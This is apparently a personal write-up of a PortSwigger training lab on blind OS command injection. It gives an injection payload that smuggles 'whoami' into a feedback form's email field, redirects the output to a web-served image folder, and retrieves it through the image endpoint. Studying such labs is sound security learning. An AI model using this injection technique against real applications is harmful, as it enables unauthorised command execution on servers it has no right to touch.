# Blind OS Command Injection — Output Redirection

## Definition



**Blind OS Command Injection** occurs when user-controlled input allows OS command execution, but the command 
output is not returned directly in the HTTP response.



## Lab



**Lab:** Blind OS command injection with output redirection

**Difficulty:** Practitioner

**Function:** Feedback

**Parameter:** `email`



### Goal



Execute `whoami` and retrieve its output.



## Exploitation



Inject the following into the `email` parameter:



```text

||whoami>/var/www/images/output.txt||

```



### Payload Breakdown



* `||` → Shell operator used to inject the command.

* `whoami` → Executes the command to identify the current user.

* `>` → Redirects the command output to a file.

* `/var/www/images/output.txt` → Writable and web-accessible location provided by the lab.



The command output is therefore saved to:



```text

/var/www/images/output.txt

```



## Retrieving the Output



The product image endpoint was:



```http

GET /image?filename=31.jpg HTTP/2

```



Change the filename to:



```text

filename=output.txt

```



Result:



```http

GET /image?filename=output.txt HTTP/2

```



The response contains the output of `whoami`.




## Attack Flow



```text

Feedback request

      ↓

OS command injection

      ↓

whoami

      ↓

Output redirected to output.txt

      ↓

/image?filename=output.txt

      ↓
Retrieve command output

```



### Key Takeaway



When OS command injection is **blind**, output redirection can be used to write command output to a location that 
the application can later serve.



**Lab solved ✅**


Source: [PortSwigger — OS Command Injection](https://portswigger.net/web-security/os-command-injection?utm_source=chatgpt.com)
